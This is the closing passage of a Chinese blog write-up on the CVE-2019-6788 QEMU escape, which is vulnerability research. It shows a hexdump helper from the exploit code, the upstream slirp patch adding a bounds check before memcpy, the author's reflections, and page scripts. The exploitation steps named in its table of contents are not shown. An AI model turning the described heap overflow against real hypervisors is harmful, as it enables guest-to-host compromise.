buff[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *pc = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s:\n"</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  ZERO LENGTH\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  NEGATIVE LENGTH: %i\n"</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don't print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"  %04x "</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %02x"</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">'.'</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞patch"><a href="#漏洞patch" class="headerlink" title="漏洞patch"></a>漏洞patch</h2><p>在memcpy前增加了长度检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="keyword">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen   <span class="comment">//增加了检查</span></span><br><span class="line">					- (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;</span><br><span class="line">			    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br></pre></td></tr></table></figure>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>搜这个CVE的时候看到了一个师傅的分析，其中引用的一个大佬的话发人深省。</p>
<p>最近在想分析漏洞究竟要到什么地步才算分析透彻，个人觉得能理解一个漏洞产生的原因，利用链以及挖掘相同漏洞的经验就算分析的比较透彻了，这也是我需要向raycp和其他师傅学习的东西。</p>
<p><img src="/2021/01/02/cve-2019-6788/15.png" alt=""></p>
<p>最后的最后来点碎碎念，昨晚做梦跟一个尊敬的前辈聊天，问他我怎样才能进入xx实验室，前辈说我不够努力，是进不去的，醒来非常难受，希望寒假可以真真切切地做点事情。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90#%E8%A1%A5%E4%B8%81%E6%AF%94%E5%AF%B9" target="_blank" rel="noopener">qemu-pwn cve-2019-6788堆溢出漏洞分析</a></p>

      
    </div>

    

    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持将鼓励我继续创作</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
        <p>WeChat Pay</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
        <p>Alipay</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/12/24/winpwn/" rel="next" title="winpwn">
                <i class="fa fa-chevron-left"></i> winpwn
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/01/07/cve-2018-1160/" rel="prev" title="CVE-2018-1160 netatalk越界漏洞复现及分析">
                CVE-2018-1160 netatalk越界漏洞复现及分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/head.png"
                alt="ama2in9" />
            
              <p class="site-author-name" itemprop="name">ama2in9</p>
              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">75</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">33</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/xmzyshypnc" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-6788-Qemu逃逸漏洞复现与分析"><span class="nav-number">1.</span> <span class="nav-text">CVE-2019-6788 Qemu逃逸漏洞复现与分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc原语"><span class="nav-number">1.4.1.</span> <span class="nav-text">malloc原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址写"><span class="nav-number">1.4.2.</span> <span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#地址泄露"><span class="nav-number">1.4.3.</span> <span class="nav-text">地址泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持控制流"><span class="nav-number">1.4.4.</span> <span class="nav-text">劫持控制流</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试记录"><span class="nav-number">1.5.</span> <span class="nav-text">调试记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-c"><span class="nav-number">1.6.</span> <span class="nav-text">exp.c</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞patch"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">1.8.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.9.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ama2in9</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://ama2in9.top/2021/01/02/cve-2019-6788/';
        this.page.identifier = '2021/01/02/cve-2019-6788/';
        this.page.title = 'CVE-2019-6788 Qemu逃逸漏洞复现与分析';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: 'Just go go',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
